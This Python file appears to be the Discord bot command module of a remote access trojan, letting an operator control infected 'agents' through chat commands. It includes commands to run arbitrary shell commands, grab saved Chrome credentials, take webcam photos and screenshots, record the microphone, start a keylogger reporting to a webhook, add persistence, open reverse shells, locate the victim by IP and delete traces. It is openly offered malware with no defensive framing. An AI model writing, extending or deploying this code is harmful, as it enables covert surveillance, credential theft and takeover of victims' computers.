
import os
import sys
import threading
import discord
from discord.ext import commands
from code.discord.bot import BOT
from code.discord.cogs.allowedGuild import is_allowed_guild
from code.discord.interactButton import InteractButton
from libraries import maciassdopia, keylogger


class HybridCommands(commands.Cog):

    def __init__(self, bot:BOT):
        self.bot = bot
        self.guild = bot.guild
        self.id = bot.id
        self.keylog_webhook = bot.keylog_webhook
        self.current_agent = 0


    @commands.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
    @is_allowed_guild
    async def interact(self, ctx:commands.Context, id:str):
        if self.id == id:
            self.bot.active_interactions = True
        else:
            self.bot.active_interactions = False

        my_embed = discord.Embed(
            title = f"Interacting with Agent#{id}",
            color = 0x00FF00
        )
        await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "interact-all", with_app_command = True, description = "Interact with all agents")
    @is_allowed_guild
    async def interact_all(self, ctx:commands.Context):
        self.bot.active_interactions = True
        my_embed = discord.Embed(
            title = f"Interacting with all agents",
            color = 0x00FF00
        )
        await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "background", with_app_command = True, description = "Background an agent")
    @is_allowed_guild
    async def background(self, ctx:commands.Context):
        self.current_agent = 0
        my_embed = discord.Embed(
            title = f"Background Agent",
            color = 0x00FF00
        )
        await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "cmd", with_app_command = True, description = "Run any command on the target machine")
    @is_allowed_guild
    async def cmd(self, ctx:commands.Context, command:str):
        if self.bot.active_interactions:
            result = maciassdopia.cmd(command)
            if len(result) > 2000:
                path = os.environ["temp"] + "\\response.txt"
                with open(path, 'w') as file:
                    file.write(result)
                await ctx.reply(file = discord.File(path))
                os.remove(path)
            else:
                await ctx.reply(f"```{result}```")


    @commands.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
    @is_allowed_guild
    async def cmd_all(self, ctx:commands.Context, command:str):
        result = maciassdopia.cmd(command)
        if len(result) > 2000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file = discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```{result}```")


    @commands.hybrid_command(name = "webshot", with_app_command = True, description = "Capture a picture from the target machine's screen")
    @is_allowed_guild
    async def webshot(self, ctx:commands.Context):
         if self.bot.active_interactions:
            if ctx.interaction:
                my_embed = discord.Embed(
                    title = f"Please use **!webshot {self.id}** instead of the slash command",
                    color = 0xFF0000
                )
                await ctx.reply(embed = my_embed)
            else:
                result = maciassdopia.webshot()
                if result != False:
                    await ctx.reply(file = discord.File(result))
                    os.remove(result)
                else:
                    my_embed = discord.Embed(
                        title = f"Error while taking photo to Agent#{self.id}",
                        color = 0xFF0000
                    )
                    await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
    @is_allowed_guild
    async def cd(self, ctx:commands.Context, path:str):
         if self.bot.active_interactions:
            result = maciassdopia.cd(path)
            if (result):
                my_embed = discord.Embed(
                    title = f"Succesfully changed directory to: {path}",
                    color = 0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title = f"Error while changing directory:\n{result}",
                    color = 0xFF0000
                )
            await ctx.reply(embed = my_embed)



    @commands.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
    @is_allowed_guild
    async def process(self, ctx:commands.Context):
         if self.bot.active_interactions:
            result = maciassdopia.process()
            if len(result) > 2000:
                path = os.environ["temp"] + "\\response.txt"
                with open(path, 'w') as file:
                    file.write(result)
                await ctx.reply(file = discord.File(path))
                os.remove(path)
            else:
                await ctx.reply(f"```{result}```")


    @commands.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
    @is_allowed_guild
    async def upload(self, ctx:commands.Context, url:str, name:str):
         if self.bot.active_interactions:
            result = maciassdopia.upload(url, name)
            if result:
                my_embed = discord.Embed(
                    title = f"{name} has been uploaded to Agent#{self.id}",
                    color = 0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title = f"Error while uploading {name} to Agent#{self.id}:\n{result}",
                    color = 0xFF0000
                )
            await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
    @is_allowed_guild
    async def screenshot(self, ctx:commands.Context):
         if self.bot.active_interactions:
            result = maciassdopia.screenshot()
            if result != False:
                await ctx.reply(file = discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(
                    title = f"Error while taking screenshot of Agent#{self.id}",
                    color = 0xFF0000
                )
                await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
    @is_allowed_guild
    async def creds(self, ctx:commands.Context):
         if self.bot.active_interactions:
            result = maciassdopia.creds()
            if result != False:
                await ctx.reply(file = discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(
                    title = f"Error while grabbing credentials from Agent#{self.id}",
                    color = 0xFF0000
                )
                await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
    @is_allowed_guild
    async def persistent(self, ctx:commands.Context):
         if self.bot.active_interactions:
            result = maciassdopia.persistent()
            if result:
                my_embed = discord.Embed(
                    title = f"Persistance enableed on Agent#{self.id}",
                    color = 0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title = f"Error while enabling persistance on Agent#{self.id}",
                    color = 0xFF0000
                )
            await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
    @is_allowed_guild
    async def ls(self, ctx: commands.Context):
        if ctx.interaction:
            my_embed = discord.Embed(
                title = f"Please use **!ls {self.id}** instead of the slash command",
                color = 0xFF0000
            )
            await ctx.reply(embed = my_embed)
        else:
            my_embed = discord.Embed(
                title = f"Agent #{self.id}   IP: {maciassdopia.getIP()}",
                color = 0xADD8E6
            )
            my_embed.add_field(
                name = "**OS**",
                value = maciassdopia.getOS(),
                inline = False
            )
            my_embed.add_field(
                name = "**Username**",
                value = maciassdopia.getUsername(),
                inline = True
            )
            view = InteractButton("Interact", self.id, self.bot)
            await ctx.reply(embed = my_embed, view = view)


    @commands.hybrid_command(name = "download", with_app_command = True, description = "Download file from the target machine")
    @is_allowed_guild
    async def download(self, ctx:commands.Context, path:str):
         if self.bot.active_interactions:
            try:
                await ctx.reply(f"**Agent #{self.id}** Requested File", file = discord.File(path))
            except Exception as e:
                my_embed = discord.Embed(
                    title=f"Error while downloading from Agent#{self.id}:\n{e}",
                    color=0xFF0000
                )
                await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
    @is_allowed_guild
    async def terminate(self, ctx:commands.Context):
         if self.bot.active_interactions:
            my_embed = discord.Embed(
                title=f"Terminating connection with Agent#{self.id}",
                color=0x00FF00
            )
            await ctx.reply(embed = my_embed)
            await self.bot.close()
            sys.exit()


    @commands.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
    @is_allowed_guild
    async def selfdestruct(self, ctx:commands.Context):
         if self.bot.active_interactions:
            result = maciassdopia.selfdestruct()
            if result:
                my_embed = discord.Embed(
                    title=f"Agent#{self.id} has been deleted",
                    color=0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title=f"Error while deleting Agent#{self.id}: {result}",
                    color=0xFF0000
                )
            await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
    @is_allowed_guild
    async def location(self, ctx:commands.Context):
         if self.bot.active_interactions:
            response = maciassdopia.location()
            if response != False:
                my_embed = discord.Embed(
                    title = f"IP Based Location on Agent#{self.id}",
                    color = 0x00FF00
                )
                my_embed.add_field(name="IP:", value=f"**{response['ip']}**", inline=False)
                my_embed.add_field(name="Hostname:", value=f"**{response['hostname']}**", inline=False)
                my_embed.add_field(name="City:", value=f"**{response['city']}**", inline=False)
                my_embed.add_field(name="Region:", value=f"**{response['region']}**", inline=False)
                my_embed.add_field(name="Country:", value=f"**{response['country']}**", inline=False)
                my_embed.add_field(name="ISP:", value=f"**{response['org']}**", inline=False)
            else:
                my_embed = discord.Embed(
                    title=f"Error while getting location of Agent#{self.id}",
                    color=0xFF0000
                )
            await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
    @is_allowed_guild
    async def revshell(self, ctx:commands.Context, ip:str, port:str):
         if self.bot.active_interactions:
            result = maciassdopia.revshell(ip, port)
            if result:
                my_embed = discord.Embed(
                    title = f"Attempting to Estabilish Reverse Shell on Agent#{self.id}",
                    color = 0x00FF00
                )
            await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
    @is_allowed_guild
    async def recordmic(self, ctx:commands.Context, seconds:int):
         if self.bot.active_interactions:
            if ctx.interaction:
                my_embed = discord.Embed(
                    title = f"Please use **!recordmic {self.id}** instead of the slash command",
                    color = 0xFF0000
                )
                await ctx.reply(embed = my_embed)
            else:
                result = maciassdopia.recordmic(seconds)
                if result != False:
                    await ctx.reply(file = discord.File(result))
                    os.remove(result)
                else:
                    my_embed = discord.Embed(
                        title=f"Error while starting recording on Agent#{self.id}",
                        color=0xFF0000
                    )
                    await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
    @is_allowed_guild
    async def wallpaper(self, ctx:commands.Context, path_url:str):
         if self.bot.active_interactions:
            result = maciassdopia.wallpaper(path_url)
            if result:
                my_embed = discord.Embed(
                    title=f"Wallpaper changed on Agent#{self.id}",
                    color=0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title=f"Error while changing wallpaper on Agent#{self.id}",
                    color=0xFF0000
                )
            await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
    @is_allowed_guild
    async def killproc(self, ctx:commands.Context, pid:int):
         if self.bot.active_interactions:
            result = maciassdopia.killproc(pid)
            if result:
                my_embed = discord.Embed(
                    title=f"Process {pid} killed on Agent#{self.id}",
                    color=0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title=f"Error while killing process {pid} on Agent#{self.id}",
                    color=0xFF0000
                )
            await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
    @is_allowed_guild
    async def keylog(self, ctx:commands.Context, mode:str, interval:int):
         if self.bot.active_interactions:
            logger = keylogger.Keylogger(
                interval = interval,
                ID = self.id,
                webhook = self.keylog,
                report_method = "webhook"
            )
            if mode == "stop":
                logger.stop()
                my_embed = discord.Embed(
                    title = f"Keylogger stopped on Agent#{self.id}",
                    color = 0x00FF00
                )
            else:
                threading.Thread(target = logger.start()).start()
                my_embed = discord.Embed(
                    title = f"Keylogger started on Agent#{self.id}",
                    color = 0x00FF00
                )
            await ctx.reply(embed = my_embed)
            
            
    @commands.hybrid_command(name = "write", with_app_command = True, description = "Type specified characters on Agent")
    @is_allowed_guild
    async def write(self, ctx:commands.Context, string:str, interval:float = 0.25):
         if self.bot.active_interactions:
            result = maciassdopia.write(string, interval)
            if result:
                my_embed = discord.Embed(
                    title=f"Typed ```{string}``` on Agent#{self.id}",
                    color=0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title=f"Error while typing ```{string}``` on Agent#{self.id}",
                    color=0xFF0000
                )
            await ctx.reply(embed = my_embed)
            
            
    @commands.hybrid_command(name = "press", with_app_command = True, description = "Press the selected key on Agent")
    @is_allowed_guild
    async def press(self, ctx:commands.Context, letter:str):
         if self.bot.active_interactions:
            result = maciassdopia.press(letter)
            if result:
                my_embed = discord.Embed(
                    title=f"Pressed ```{letter}``` on Agent#{self.id}",
                    color=0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title=f"Error while pressing ```{letter}``` on Agent#{self.id}",
                    color=0xFF0000
                )
            await ctx.reply(embed = my_embed)
            

    @commands.hybrid_command(name = "message", with_app_command = True, description = "Show message box in the center of Agent screen")
    @is_allowed_guild
    async def message(self, ctx:commands.Context, message:str):
         if self.bot.active_interactions:
            result = maciassdopia.message(message)
            if result:
                my_embed = discord.Embed(
                    title=f"Message ```{message}``` was showed Agent#{self.id}",
                    color=0x00FF00
                )
            else:
                my_embed = discord.Embed(
                    title=f"Error while showing message on Agent#{self.id}",
                    color=0xFF0000
                )
            await ctx.reply(embed = my_embed)


    @commands.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
    @is_allowed_guild
    async def help(self, ctx:commands.Context):
        my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
        my_embed.add_field(name="/help", value="Shows this menu", inline=False)
        my_embed.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
        my_embed.add_field(name="/background", value="Background your current agent", inline=False)
        my_embed.add_field(name="/cmd <command>", value="Run command on target", inline=False)
        my_embed.add_field(name="/cd <path>", value="Change current directory", inline=False)
        my_embed.add_field(name="/webshot ", value="Grab a picture from the webcam", inline=False)
        my_embed.add_field(name="/process ", value="Get a list of all running processes", inline=False)
        my_embed.add_field(name="/upload <url>", value="Upload file to agent", inline=False)
        my_embed.add_field(name="/screenshot ", value="Grab a screenshot from the agent", inline=False)
        my_embed.add_field(name="/creds ", value="Get chrome saved credentials", inline=False)
        my_embed.add_field(name="/persistent ", value="Enable persistence", inline=False)
        my_embed.add_field(name="!ls", value="Get a list of all active agents", inline=False)
        my_embed.add_field(name="/download <path>", value="Download file from agent", inline=False)
        my_embed.add_field(name="/terminate ", value="Terminate the session ", inline=False)
        my_embed.add_field(name="/cmd-all <command>", value="Run a command on all agents", inline=False)
        my_embed.add_field(name="/location ", value="Get the location of the target machine", inline=False)
        my_embed.add_field(name="/revshell <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
        my_embed.add_field(name="/recordmic <interval>", value="Record the microphone of the target machine", inline=False)
        my_embed.add_field(name="/write <text>", value="Write specified text on the target computer (As it's keyboard)", inline=False)
        my_embed.add_field(name="/press <key>", value="Press specified key (`enter` or just letters like `a`) on the target computer (As it's keyboard)", inline=False)
        my_embed.add_field(name="/message <text>", value="Show a popup message in the center of the Agent screen with specified text", inline=False)
        my_embed.add_field(name="/wallpaper <path/url>", value="Change the wallpaper of the target machine", inline=False)
        my_embed.add_field(name="/killproc <pid>", value="Kill a process on the target machine", inline=False)
        my_embed.add_field(name="/keylog <mode> <interval>", value="Start/Stop a keylogger on the target machine\n/`keylog start 60`", inline=False)
        await ctx.reply(embed = my_embed)


async def setup(bot:BOT):
    await bot.add_cog(HybridCommands(bot))
